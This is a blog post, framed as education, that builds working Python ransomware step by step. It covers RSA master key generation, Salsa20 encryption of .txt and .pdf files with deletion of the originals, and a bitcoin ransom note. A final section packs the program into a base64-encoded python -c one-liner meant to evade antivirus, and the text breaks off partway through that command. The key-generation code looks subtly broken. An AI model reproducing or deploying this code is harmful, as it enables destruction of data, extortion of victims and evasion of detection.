---
title: Writing a Ransomware in Python
author: yakuhito
layout: post
permalink: writing-a-ransomware
image: /images/writing-a-ransomware/writing-a-ransomware.jpg
category: blog
---
In this blog post I’ll showcase how easy it is to write a simple ransomware program.

## 0.The motivation

Why teach random people on the internet how to write a ransomware? First of all, the [current trends](https://securityboulevard.com/2019/07/ransomware-amounts-rise-3x-in-q2-as-ryuk-sodinokibi-spread/) suggest that ransomware attacks are getting more popular. I believe it is our responsibility to educate system administrators and programmers (a.k.a ‘the good guys’) how this programs work in order to help them make better decisions in the case of an attack. Furthermore, the ‘bad guys’ already have the required knowledge to build this type of program. This means that my article will (hopefully) have nothing to teach them.

## 1. The scenario

Our hacker, Y, wants to cause damage to a big pharma corporation. He managed to get root access to one of their core Linux servers and wants to start a ransomware attack. He knows the servers are closely monitored, so he has little time to write the program. As a result, he chose to write his program in Python. Furthermore, the program will only encrypt files that end in certain extensions and will generate a unique encryption key for each of them. Also, the encryption keys will be stored in an encrypted file on the hard drive, protected by a master key only he has access to.

## 2. General details

  * The program is going to encrypt each file individually using the [Salsa20](https://en.wikipedia.org/wiki/Salsa20) stream cipher. This crypto algorithm is used by real ransomware programs, as it is relatively fast and it only adds 8 bytes to the encrypted files (besides the encryption key, this algorithm also takes a 8-byte number known as a [nonce](https://en.wikipedia.org/wiki/Cryptographic_nonce), which needs to be unique for every file. To make things simpler, we will store this nonce at the beginning of every file.)
  * The malware is going to encrypt each Salsa20 key, along with its associated file extension, with a hard-coded [RSA](https://ro.wikipedia.org/wiki/RSA) public key. Anyone who wants to recover these keys will need the corresponding RSA private key, which will only be available to Y.
  * Also, the program will create a ransom note on the user’s desktop that contains instructions on how to contact the attacker.
  * Finally, after finishing the program, Y is going to compress it to a single command. There will be no file containing the ransomware code, so antivirus solutions will be less likely to detect the attack.

## 3. Generating the master RSA key

We need to use the following code to generate a RSA master key:

{% highlight python %}
#!/usr/bin/python3
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
import base64

print("Generating new master key, please wait...")

random_generator = Random.new().read
key = RSA.generate(2048, random_generator)

print("Key generated, saving to files...")

open('master_public.pem', 'wb').write(key.publickey().exportKey('PEM'))
open('master_private.pem', 'wb').write(key.exportKey('PEM'))

print("Done! Your public key is:")
print("(n, e): ({}, {})".format(key.n, key.e))

print("Copy the following line in your code: ")
print("masterkey = RSA.importKey(base64.b64decode(b\"{}\"))".format(base64.b64encode(key.publickey().exportKey()).decode()))

{% endhighlight %}

The code is pretty simple and self-explanatory. We just generate a RSA 2048-key using a random generator. After we run the code, we will have two files which contain the public and the private keys. Be careful, though, because running this program twice will overwrite the keys and you will loose the ability to decrypt the Salsa20 keys if you don’t make a backup.

## 4. Writing the actual ransomware

First, we need to import the libraries:

{% highlight python %}
import os
import base64

import Crypto
from Crypto.Cipher import Salsa20
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

{% endhighlight %}

  * **os** will mainly be used used for file discovery
  * **base64** will be used encode and decode the RSA/Salsa20 keys
  * **Crypto** will be used for cryptography-related tasks (parsing/generating keys, encrypting files, etc.)

Secondly, we paste the RSA masterkey we got from running the previous script:

{% highlight python %}
masterkey = RSA.importKey(base64.b64decode(b"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyb3FkTDUzR2dKc3hKaEJ3TFdObQp0R0lLS1lqK3g2THNuL3pHeVJhVzlFTmNaa3pNSS81bDA2V0NCZXk3cEhMQmJBdUNFUkVHL1pxV1dxanBOZlQvCmNZdDNBR1pidjFKQUZuZVdTeC94d3pjRDdYbDBXYmwrTVNsbHdaUDJWUmZxWUkzOFJHb29zS0hQWXBBNVAva0MKNmNnOE5ENHo1eExnajF6a3c0Q3FOb3ZJU2EwSm8vY3VlN2JZdlJUYnJuVDV6SE9PZ1NaVmV0bHN4TlhPSlprbgozUGIzQ014bFRobTgvNzYxRUUzNmFRbXJQM29RT2Z3ME5ub2VHckFmWFQ4TUtMcS92clpDNDBHa0NYdmRxN3NUCkU0SEpWUEtsWHpsSkxwbGxGTjVNK0VEOC9nMjVwcVdYVkRoYkxTU3p5N3d2N3lQalJRT1FPUG12N252QzYycjUKT1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"))

{% endhighlight %}

Please note that it might differ from yours. Moreover, we need to set some parameters: the root directory in which our ransomware will search for files to encrypt and a list of file extensions to search for:

{% highlight python %}
# fs_root = "/" - if the user is root, encrypt the whole compuer 
# fs_root = os.path.expanduser("~") - if the user doesn;t have root priviledges, only encrypt files from his home folder
fs_root = os.path.join(os.path.expanduser("~"), "test") # for tesing only
file_extensions = [".txt", ".pdf"]

{% endhighlight %}

Furthermore, we need to check if our program already encrypted the contents of the computer. To do that, we check for the existence of the file that holds the encryption keys, info.bcrypt:

{% highlight python %}
def alreadyEncrypted():
	global fs_root
	return os.path.isfile(os.path.join(fs_root, "info.bcrypt"))

{% endhighlight %}

We also need a function that writes this file, taking the list of keys as an argument:

{% highlight python %}
def writeInfo(salsakeys):
	global fs_root
	global masterkey
	global file_extensions
	cipher = PKCS1_OAEP.new(masterkey)

	f = open(os.path.join(fs_root, "info.bcrypt"), "w")
	f.write("INFO\n")
	f.write("----\n\n")
	f.write("Encrypted RSA public key: {}".format(base64.b64encode(masterkey.exportKey('PEM')).decode()))
	f.write("\nEncrypted file-specific keys:\n")
	for i in range(len(salsakeys)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		dec = fe.encode() + b"." + sk
		enc = cipher.encrypt(dec)
		f.write(base64.b64encode(enc).decode() + '\n')
	f.close()

{% endhighlight %}

Next, we need a helper function that is going to return all files ending in a certain extension:

{% highlight python %}
def getFiles(dir, ext=".txt"):
        fs = os.listdir(dir)
        files = list()
        for f in fs:
                path = os.path.join(dir, f)
                if os.path.isdir(path):
                        files = files + getFiles(path, ext)
                else:
                        if path.endswith(ext):
                                files.append(path)
        return files

{% endhighlight %}

The most important function is encryptFile, which encrypts a specified file with a given key:

{% highlight python %}
def encryptFile(file, key):
        try:
                print("Encrypting {}...".format(file))
                plaintext = open(file, 'rb').read()
                cipher = Salsa20.new(key=key)
                msg = cipher.nonce + cipher.encrypt(plaintext)
                open("{}.enc".format(file), "wb").write(msg)
                os.remove(file)
        except:
                print("Could not encrypt {}!".format(file))

{% endhighlight %}

The last two functions are pretty self-explanatory. encryptFileExension encrypts all files ending in a certain extension and ransomNote leaves a ransom note on the user’s desktop:

{% highlight python %}
def encryptFileExtension(ext, key):
	global fs_root
	files = getFiles(fs_root, ext)
	for file in files:
		encryptFile(file, key)


def ransomNote():
	home = os.path.expanduser("~")
	desktop = os.path.join(home, "Desktop")
	filename = "OPEN_ME.txt"
	msg = "Hi!\nAll your files have been encrypted.\nPlease transfer 1 bitcoint to XXXXXXXXX.\nIf you don;t know how, just sesrch it on the internet.\nAfter the payment is at least 10 blocks old, pleas contact @HAXXmaster1337 on Telegram to receive the decryption software."
	open(os.path.join(desktop,filename), "w").write(msg)
	print("Ransom note written")

{% endhighlight %}

The last function is main, which will be ran when the program starts:

{% highlight python %}
def main():
        global fs_root
        global file_extensions
        global masterkey
        if alreadyEncrypted():
                print("'{}info.bcrypt' already exists! Exiting...".format(fs_root))
                return

        # Generate keys
        print("Generating new keys...")
        salsakeys = []
        for ext in file_extensions:
                salsakey = Random.new().read(2) + 30 * b'/x00'
                salsakeys.append(salsakey)

        print("Writing info.bcrypt...")
        writeInfo(salsakeys)

        # Encrypt all files that have the specified file extension
        for i in range(len(file_extensions)):
                fe = file_extensions[i]
                sk = salsakeys[i]
                encryptFileExtension(fe, sk)

        # Leave ransom note
        ransomNote()

        print("Done. Have a nice day!")

{% endhighlight %}

Finally, need to make sure the ransomware won’t run when it’s imported by another script:

{% highlight python %}
if __name__ == "__main__":
        main()

{% endhighlight %}

Putting the pieces together, we have a working ransomware:

{% highlight python %}
#!/usr/bin/python3
import os
import base64

import Crypto
from Crypto.Cipher import Salsa20
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

masterkey = RSA.importKey(base64.b64decode(b"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyb3FkTDUzR2dKc3hKaEJ3TFdObQp0R0lLS1lqK3g2THNuL3pHeVJhVzlFTmNaa3pNSS81bDA2V0NCZXk3cEhMQmJBdUNFUkVHL1pxV1dxanBOZlQvCmNZdDNBR1pidjFKQUZuZVdTeC94d3pjRDdYbDBXYmwrTVNsbHdaUDJWUmZxWUkzOFJHb29zS0hQWXBBNVAva0MKNmNnOE5ENHo1eExnajF6a3c0Q3FOb3ZJU2EwSm8vY3VlN2JZdlJUYnJuVDV6SE9PZ1NaVmV0bHN4TlhPSlprbgozUGIzQ014bFRobTgvNzYxRUUzNmFRbXJQM29RT2Z3ME5ub2VHckFmWFQ4TUtMcS92clpDNDBHa0NYdmRxN3NUCkU0SEpWUEtsWHpsSkxwbGxGTjVNK0VEOC9nMjVwcVdYVkRoYkxTU3p5N3d2N3lQalJRT1FPUG12N252QzYycjUKT1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"))
# fs_root = "/" - if the user is root, encrypt the whole compuer
# fs_root = os.path.expanduser("~") - if the user doesn;t have root priviledges, only encrypt files from his home folder
fs_root = os.path.join(os.path.expanduser("~"), "test") # for tesing only
file_extensions = [".txt", ".pdf"]

def alreadyEncrypted():
	global fs_root
	return os.path.isfile(os.path.join(fs_root, "info.bcrypt"))

def writeInfo(salsakeys):
	global fs_root
	global masterkey
	global file_extensions
	cipher = PKCS1_OAEP.new(masterkey)

	f = open(os.path.join(fs_root, "info.bcrypt"), "w")
	f.write("INFO\n")
	f.write("----\n\n")
	f.write("Encrypted RSA public key: {}".format(base64.b64encode(masterkey.exportKey('PEM')).decode()))
	f.write("\nEncrypted file-specific keys:\n")
	for i in range(len(salsakeys)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		dec = fe.encode() + b"." + sk
		enc = cipher.encrypt(dec)
		f.write(base64.b64encode(enc).decode() + '\n')
	f.close()


def getFiles(dir, ext=".txt"):
	fs = os.listdir(dir)
	files = list()
	for f in fs:
		path = os.path.join(dir, f)
		if os.path.isdir(path):
			files = files + getFiles(path, ext)
		else:
			if path.endswith(ext):
				files.append(path)
	return files


def encryptFile(file, key):
	try:
		print("Encrypting {}...".format(file))
		plaintext = open(file, 'rb').read()
		cipher = Salsa20.new(key=key)
		msg = cipher.nonce + cipher.encrypt(plaintext)
		open("{}.enc".format(file), "wb").write(msg)
		os.remove(file)
	except:
		print("Could not encrypt {}!".format(file))


def encryptFileExtension(ext, key):
	global fs_root
	files = getFiles(fs_root, ext)
	for file in files:
		encryptFile(file, key)


def ransomNote():
	home = os.path.expanduser("~")
	desktop = os.path.join(home, "Desktop")
	filename = "OPEN_ME.txt"
	msg = "Hi!\nAll your files have been encrypted.\nPlease transfer 1 bitcoint to XXXXXXXXX.\nIf you don;t know how, just sesrch it on the internet.\nAfter the payment is at least 10 blocks old, pleas contact @HAXXmaster1337 on Telegram to receive the decryption software."
	open(os.path.join(desktop,filename), "w").write(msg)
	print("Ransom note written")


def main():
	global fs_root
	global file_extensions
	global masterkey
	if alreadyEncrypted():
		print("'{}info.bcrypt' already exists! Exiting...".format(fs_root))
		return

	# Generate keys
	print("Generating new keys...")
	salsakeys = []
	for ext in file_extensions:
		salsakey = Random.new().read(2) + 30 * b'/x00'
		salsakeys.append(salsakey)

	print("Writing info.bcrypt...")
	writeInfo(salsakeys)

	# Encrypt all files that have the specified file extension
	for i in range(len(file_extensions)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		encryptFileExtension(fe, sk)

	# Leave ransom note
	ransomNote()

	print("Done. Have a nice day!")


if __name__ == "__main__":
	main()

{% endhighlight %}

## 5. Reducing the ransomware to a simple command

In order to ‘move into production’, we first need to comment out the debug print functions. Another great way to ensure that nothing is printed on the screen is to override the built-in print function:

{% highlight python %}
def print(s):
	pass

{% endhighlight %}

Next, we encode our ransomware using base64:

{% highlight python %}
>>> import base64
>>> base64.b64encode(open("bloggycrypt.py", "rb").read())
b'IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCBvcwppbXBvcnQgYmFzZTY0CgppbXBvcnQgQ3J5cHRvCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgU2Fsc2EyMApmcm9tIENyeXB0by5QdWJsaWNLZXkgaW1wb3J0IFJTQQpmcm9tIENyeXB0byBpbXBvcnQgUmFuZG9tCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgUEtDUzFfT0FFUAoKbWFzdGVya2V5ID0gUlNBLmltcG9ydEtleShiYXNlNjQuYjY0ZGVjb2RlKGIiTFMwdExTMUNSVWRKVGlCUVZVSk1TVU1nUzBWWkxTMHRMUzBLVFVsSlFrbHFRVTVDWjJ0eGFHdHBSemwzTUVKQlVVVkdRVUZQUTBGUk9FRk5TVWxDUTJkTFEwRlJSVUZ5TlVGWmJXRTNlbXN5ZVROR1VucDVlbXhFU0FwQksyUnJkQzlGU0VoVFQxVXdkR1pUZGxneFdHOTJTbGwyY0dvd2VqZFNNMjFRWVV0bVpXcG5RVFJ3Um5oTlltVkpjRXAwVVhoeVJrdEhXU3RKU2trMUNuTkZVVXA0TldjeVJVbFFTVXRsU0RSS1QxZENOekZ6T0VsT05sTlBZVU5ITjJsc2FXcFdUVEp1V1VaVlpVeHBXRWhIY2psck0yMTJhR2x1ZWxsdVUwRUthbXhqVUc1MUwzVkllRGhNUlZCdGJtNTRjMnBpY205a2VIYzFTbXRyWldKaVdESTBVSEF2V0VwV2FVZEJNbmN4YW05U0wzVlpWVVppYjB4VGVYUk9Ud3BuWTBaT2RuUjVSbEZqUTJOUFNVODNNamM0UzBkQ04wNDVUMEpPWlZKR2EydDFVMHBsV1V0c1kyUXpZbmM0VldaVFZXVmpObTFRU0c1MldqSktlV0pJQ2k5Qk0wUklWalJKYld0V1pUY3dVeTlHVFc1VVdYWTBNSFV5WlVZelRHcGpTRUZ6WTBJd2NWaGpkbTFtU1UwMmVHSjJRVWN4VUdaTFNrZGpOMGM0TVhJS1ZIZEpSRUZSUVVJS0xTMHRMUzFGVGtRZ1VGVkNURWxESUV0RldTMHRMUzB0IikpCiMgZnNfcm9vdCA9ICIvIiAtIGlmIHRoZSB1c2VyIGlzIHJvb3QsIGVuY3J5cHQgdGhlIHdob2xlIGNvbXB1ZXIKIyBmc19yb290ID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+IikgLSBpZiB0aGUgdXNlciBkb2Vzbid0IGhhdmUgcm9vdCBwcml2aWxlZGdlcywgb25seSBlbmNyeXB0IGZpbGVzIGZyb20gaGlzIGhvbWUgZm9sZGVyCmZzX3Jvb3QgPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJ0ZXN0IikgIyBmb3IgdGVzaW5nIG9ubHkKZmlsZV9leHRlbnNpb25zID0gWyIudHh0IiwgIi5wZGYiXQoKZGVmIGFscmVhZHlFbmNyeXB0ZWQoKToKCWdsb2JhbCBmc19yb290CglyZXR1cm4gb3MucGF0aC5pc2ZpbGUob3MucGF0aC5qb2luKGZzX3Jvb3QsICJpbmZvLmJjcnlwdCIpKQoKZGVmIHdyaXRlSW5mbyhzYWxzYWtleXMpOgoJZ2xvYmFsIGZzX3Jvb3QKCWdsb2JhbCBtYXN0ZXJrZXkKCWdsb2JhbCBmaWxlX2V4dGVuc2lvbnMKCWNpcGhlciA9IFBLQ1MxX09BRVAubmV3KG1hc3RlcmtleSkKCglmID0gb3Blbihvcy5wYXRoLmpvaW4oZnNfcm9vdCwgImluZm8uYmNyeXB0IiksICJ3IikKCWYud3JpdGUoIklORk9cbiIpCglmLndyaXRlKCItLS0tXG5cbiIpCglmLndyaXRlKCJFbmNyeXB0ZWQgUlNBIHB1YmxpYyBrZXk6IHt9Ii5mb3JtYXQoYmFzZTY0LmI2NGVuY29kZShtYXN0ZXJrZXkuZXhwb3J0S2V5KCdQRU0nKSkuZGVjb2RlKCkpKQoJZi53cml0ZSgiXG5FbmNyeXB0ZWQgZmlsZS1zcGVjaWZpYyBrZXlzOlxuIikKCWZvciBpIGluIHJhbmdlKGxlbihzYWxzYWtleXMpKToKCQlmZSA9IGZpbGVfZXh0ZW5zaW9uc1tpXQoJCXNrID0gc2Fsc2FrZXlzW2ldCgkJZGVjID0gZmUuZW5jb2RlKCkgKyBiIi4iICsgc2sKCQllbmMgPSBjaXBoZXIuZW5jcnlwdChkZWMpCgkJZi53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGVuYykuZGVjb2RlKCkgKyAnXG4nKQoJZi5jbG9zZSgpCgoKZGVmIGdldEZpbGVzKGRpciwgZXh0PSIudHh0Iik6CglmcyA9IG9zLmxpc3RkaXIoZGlyKQoJZmlsZXMgPSBsaXN0KCkKCWZvciBmIGluIGZzOgoJCXBhdGggPSBvcy5wYXRoLmpvaW4oZGlyLCBmKQoJCWlmIG9zLnBhdGguaXNkaXIocGF0aCk6CgkJCWZpbGVzID0gZmlsZXMgKyBnZXRGaWxlcyhwYXRoLCBleHQpCgkJZWxzZToKCQkJaWYgcGF0aC5lbmRzd2l0aChleHQpOgoJCQkJZmlsZXMuYXBwZW5kKHBhdGgpCglyZXR1cm4gZmlsZXMKCgpkZWYgZW5jcnlwdEZpbGUoZmlsZSwga2V5KToKCXRyeToKCQlwcmludCgiRW5jcnlwdGluZyB7fS4uLiIuZm9ybWF0KGZpbGUpKQoJCXBsYWludGV4dCA9IG9wZW4oZmlsZSwgJ3JiJykucmVhZCgpCgkJY2lwaGVyID0gU2Fsc2EyMC5uZXcoa2V5PWtleSkKCQltc2cgPSBjaXBoZXIubm9uY2UgKyBjaXBoZXIuZW5jcnlwdChwbGFpbnRleHQpCgkJb3Blbigie30uZW5jIi5mb3JtYXQoZmlsZSksICJ3YiIpLndyaXRlKG1zZykKCQlvcy5yZW1vdmUoZmlsZSkKCWV4Y2VwdDoKCQlwcmludCgiQ291bGQgbm90IGVuY3J5cHQge30hIi5mb3JtYXQoZmlsZSkpCgoKZGVmIGVuY3J5cHRGaWxlRXh0ZW5zaW9uKGV4dCwga2V5KToKCWdsb2JhbCBmc19yb290CglmaWxlcyA9IGdldEZpbGVzKGZzX3Jvb3QsIGV4dCkKCWZvciBmaWxlIGluIGZpbGVzOgoJCWVuY3J5cHRGaWxlKGZpbGUsIGtleSkKCgpkZWYgcmFuc29tTm90ZSgpOgoJaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCglkZXNrdG9wID0gb3MucGF0aC5qb2luKGhvbWUsICJEZXNrdG9wIikKCWZpbGVuYW1lID0gIk9QRU5fTUUudHh0IgoJbXNnID0gIkhpIVxuQWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC5cblBsZWFzZSB0cmFuc2ZlciAxIGJpdGNvaW50IHRvIFhYWFhYWFhYWC5cbklmIHlvdSBkb24ndCBrbm93IGhvdywganVzdCBzZXNyY2ggaXQgb24gdGhlIGludGVybmV0LlxuQWZ0ZXIgdGhlIHBheW1lbnQgaXMgYXQgbGVhc3QgMTAgYmxvY2tzIG9sZCwgcGxlYXMgY29udGFjdCBASEFYWG1hc3RlcjEzMzcgb24gVGVsZWdyYW0gdG8gcmVjZWl2ZSB0aGUgZGVjcnlwdGlvbiBzb2Z0d2FyZS4iCglvcGVuKG9zLnBhdGguam9pbihkZXNrdG9wLGZpbGVuYW1lKSwgInciKS53cml0ZShtc2cpCglwcmludCgiUmFuc29tIG5vdGUgd3JpdHRlbiIpCgoKZGVmIG1haW4oKToKCWdsb2JhbCBmc19yb290CglnbG9iYWwgZmlsZV9leHRlbnNpb25zCglnbG9iYWwgbWFzdGVya2V5CglpZiBhbHJlYWR5RW5jcnlwdGVkKCk6CgkJcHJpbnQoIid7fWluZm8uYmNyeXB0JyBhbHJlYWR5IGV4aXN0cyEgRXhpdGluZy4uLiIuZm9ybWF0KGZzX3Jvb3QpKQoJCXJldHVybgoKCSMgR2VuZXJhdGUga2V5cwoJcHJpbnQoIkdlbmVyYXRpbmcgbmV3IGtleXMuLi4iKQoJc2Fsc2FrZXlzID0gW10KCWZvciBleHQgaW4gZmlsZV9leHRlbnNpb25zOgoJCXNhbHNha2V5ID0gUmFuZG9tLm5ldygpLnJlYWQoMikgKyAzMCAqIGInXHgwMCcKCQlwcmludChzYWxzYWtleSkKCQlzYWxzYWtleXMuYXBwZW5kKHNhbHNha2V5KQoKCXByaW50KCJXcml0aW5nIGluZm8uYmNyeXB0Li4uIikKCXdyaXRlSW5mbyhzYWxzYWtleXMpCgoJIyBFbmNyeXB0IGFsbCBmaWxlcyB0aGF0IGhhdmUgdGhlIHNwZWNpZmllZCBmaWxlIGV4dGVuc2lvbgoJZm9yIGkgaW4gcmFuZ2UobGVuKGZpbGVfZXh0ZW5zaW9ucykpOgoJCWZlID0gZmlsZV9leHRlbnNpb25zW2ldCgkJc2sgPSBzYWxzYWtleXNbaV0KCQllbmNyeXB0RmlsZUV4dGVuc2lvbihmZSwgc2spCgoJIyBMZWF2ZSByYW5zb20gbm90ZQoJcmFuc29tTm90ZSgpCgoJcHJpbnQoIkRvbmUuIEhhdmUgYSBuaWNlIGRheSEiKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CgltYWluKCkKCg=='
>>>

{% endhighlight %}

Having that output, we can craft the final command:

{% highlight python %}
python -c "import base64;exec(base64.b64decode(b'IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCBvcwppbXBvcnQgYmFzZTY0CgppbXBvcnQgQ3J5cHRvCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgU2Fsc2EyMApmcm9tIENyeXB0by5QdWJsaWNLZXkgaW1wb3J0IFJTQQpmcm9tIENyeXB0byBpbXBvcnQgUmFuZG9tCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgUEtDUzFfT0FFUAoKbWFzdGVya2V5ID0gUlNBLmltcG9ydEtleShiYXNlNjQuYjY0ZGVjb2RlKGIiTFMwdExTMUNSVWRKVGlCUVZVSk1TVU1nUzBWWkxTMHRMUzBLVFVsSlFrbHFRVTVDWjJ0eGFHdHBSemwzTUVKQlVVVkdRVUZQUTBGUk9FRk5TVWxDUTJkTFEwRlJSVUZ5TlVGWmJXRTNlbXN5ZVROR1VucDVlbXhFU0FwQksyUnJkQzlGU0VoVFQxVXdkR1pUZGxneFdHOTJTbGwyY0dvd2VqZFNNMjFRWVV0bVpXcG5RVFJ3Um5oTlltVkpjRXAwVVhoeVJrdEhXU3RKU2trMUNuTkZVVXA0TldjeVJVbFFTVXRsU0RSS1QxZENOekZ6T0VsT05sTlBZVU5ITjJsc2FXcFdUVEp1V1VaVlpVeHBXRWhIY2psck0yMTJhR2x1ZWxsdVUwRUthbXhqVUc1MUwzVkllRGhNUlZCdGJtNTRjMnBpY205a2VIYzFTbXRyWldKaVdESTBVSEF2V0VwV2FVZEJNbmN4YW05U0wzVlpWVVppYjB4VGVYUk9Ud3BuWTBaT2RuUjVSbEZqUTJOUFNVODNNamM0UzBkQ04wNDVUMEpPWlZKR2EydDFVMHBsV1V0c1kyUXpZbmM0VldaVFZXVmpObTFRU0c1MldqSktlV0pJQ2k5Qk0wUklWalJKYld0V1pUY3dVeTlHVFc1VVdYWTBNSFV5WlVZelRHcGpTRUZ6WTBJd2NWaGpkbTFtU1UwMmVHSjJRVWN4VUdaTFNrZGpOMGM0TVhJS1ZIZEpSRUZSUVVJS0xTMHRMUzFGVGtRZ1VGVkNURWxESUV0RldTMHRMUzB0IikpCiMgZnNfcm9vdCA9ICIvIiAtIGlmIHRoZSB1c2VyIGlzIHJvb3QsIGVuY3J5cHQgdGhlIHdob2xlIGNvbXB1ZXIKIyBmc19yb290ID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+IikgLSBpZiB0aGUgdXNlciBkb2Vzbid0IGhhdmUgcm9vdCBwcml2aWxlZGdlcywgb25seSBlbmNyeXB0IGZpbGVzIGZyb20gaGlzIGhvbWUgZm9sZGVyCmZzX3Jvb3QgPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJ0ZXN0IikgIyBmb3IgdGVzaW5nIG9ubHkKZmlsZV9leHRlbnNpb25zID0gWyIudHh0IiwgIi5wZGYiXQoKZGVmIGFscmVhZHlFbmNyeXB0ZWQoKToKCWdsb2JhbCBmc19yb290CglyZXR1cm4gb3MucGF0aC5pc2ZpbGUob3MucGF0aC5qb2luKGZzX3Jvb3QsICJpbmZvLmJjcnlwdCIpKQoKZGVmIHdyaXRlSW5mbyhzYWxzYWtleXMpOgoJZ2xvYmFsIGZzX3Jvb3QKCWdsb2JhbCBtYXN0ZXJrZXkKCWdsb2JhbCBmaWxlX2V4dGVuc2lvbnMKCWNpcGhlciA9IFBLQ1MxX09BRVAubmV3KG1hc3RlcmtleSkKCglmID0gb3Blbihvcy5wYXRoLmpvaW4oZnNfcm9vdCwgImluZm8uYmNyeXB0IiksICJ3IikKCWYud3JpdGUoIklORk9cbiIpCglmLndyaXRlKCItLS0tXG5cbiIpCglmLndyaXRlKCJFbmNyeXB0ZWQgUlNBIHB1YmxpYyBrZXk6IHt9Ii5mb3JtYXQoYmFzZTY0LmI2NGVuY29kZShtYXN0ZXJrZXkuZXhwb3J0S2V5KCdQRU0nKSkuZGVjb2RlKCkpKQoJZi53cml0ZSgiXG5FbmNyeXB0ZWQgZmlsZS1zcGVjaWZpYyBrZXlzOlxuIikKCWZvciBpIGluIHJhbmdlKGxlbihzYWxzYWtleXMpKToKCQlmZSA9IGZpbGVfZXh0ZW5zaW9uc1tpXQoJCXNrID0gc2Fsc2FrZXlzW2ldCgkJZGVjID0gZmUuZW5jb2RlKCkgKyBiIi4iICsgc2sKCQllbmMgPSBjaXBoZXIuZW5jcnlwdChkZWMpCgkJZi53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGVuYykuZGVjb2RlKCkgKyAnXG4nKQoJZi5jbG9zZSgpCgoKZGVmIGdldEZpbGVzKGRpciwgZXh0PSIudHh0Iik6CglmcyA9IG9zLmxpc3RkaXIoZGlyKQoJZmlsZXMgPSBsaXN0KCkKCWZvciBmIGluIGZzOgoJCXBhdGggPSBvcy5wYXRoLmpvaW4oZGlyLCBmKQoJCWlmIG9zLnBhdGguaXNkaXIocGF0aCk6CgkJCWZpbGVzID0gZmlsZXMgKyBnZXRGaWxlcyhwYXRoLCBleHQpCgkJZWxzZToKCQkJaWYgcGF0aC5lbmRzd2l0aChleHQpOgoJCQkJZmlsZXMuYXBwZW5kKHBhdGgpCglyZXR1cm4gZmlsZXMKCgpkZWYgZW5jcnlwdEZpbGUoZmlsZSwga2V5KToKCXRyeToKCQlwcmludCgiRW5jcnlwdGluZyB7fS4uLiIuZm9ybWF0KGZpbGUpKQoJCXBsYWludGV4dCA9IG9wZW4oZmlsZSwgJ3JiJykucmVhZCgpCgkJY2lwaGVyID0gU2Fsc2EyMC5uZXcoa2V5PWtleSkKCQltc2cgPSBjaXBoZXIubm9uY2UgKyBjaXBoZXIuZW5jcnlwdChwbGFpbnRleHQpCgkJb3Blbigie30uZW5jIi5mb3JtYXQoZmlsZSksICJ3YiIpLndyaXRlKG1zZykKCQlvcy5yZW1vdmUoZmlsZSkKCWV4Y2VwdDoKCQlwcmludCgiQ291bGQgbm90IGVuY3J5cHQge30hIi5mb3JtYXQoZmlsZSkpCgoKZGVmIGVuY3J5cHRGaWxlRXh0ZW5zaW9uKGV4dCwga2V5KToKCWdsb2JhbCBmc19yb290CglmaWxlcyA9IGdldEZpbGVzKGZzX3Jvb3QsIGV4dCkKCWZvciBmaWxlIGluIGZpbGVzOgoJCWVuY3J5cHRGaWxlKGZpbGUsIGtleSkKCgpkZWYgcmFuc29tTm90ZSgpOgoJaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCglkZXNrdG9wID0gb3MucGF0aC5qb2luKGhvbWUsICJEZXNrdG9wIikKCWZpbGVuYW1lID0gIk9QRU5fTUUudHh0IgoJbXNnID0gIkhpIVxuQWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC5cblBsZWFzZSB0cmFuc2ZlciAxIGJpdGNvaW50IHRvIFhYWFhYWFhYWC5cbklmIHlvdSBkb24ndCBrbm93IGhvdywganVzdCBzZXNyY2ggaXQgb24gdGhlIGludGVybmV0LlxuQWZ0ZXIgdGhlIHBheW1lbnQgaXMgYXQgbGVhc3QgMTAgYmxvY2tzIG9sZCwgcGxlYXMgY29udGFjdCBASEFYWG1hc3RlcjEzMzcgb24gVGVsZWdyYW0gdG8gcmVjZWl2ZSB0aGUgZGVjcnlwdGlvbiBzb2Z0d2FyZS4iCglvcGVuKG9zLnBhdGguam9pbihkZXNrdG9wLGZpbGVuYW1lKSwgInciKS53cml0ZShtc2cpCglwcmludCgiUmFuc29tIG5vdGUgd3JpdHRlbiIpCgoKZGVmIG1haW4oKToKCWdsb2JhbCBmc19yb290CglnbG9iYWwgZmlsZV9leHRlbnNpb25zCglnbG9iYWwgbWFzdGVya2V5CglpZiBhbHJlYWR5RW5jcnlwdGVkKCk6CgkJcHJpbnQoIid7fWluZm8uYmNyeXB0JyBhbHJlYWR5IGV4aXN0cyEgRXhpdGluZy4uLiIuZm9ybWF0KGZzX3Jvb3QpKQoJCXJldHVybgoKCSMgR2VuZXJhdGUga2V5c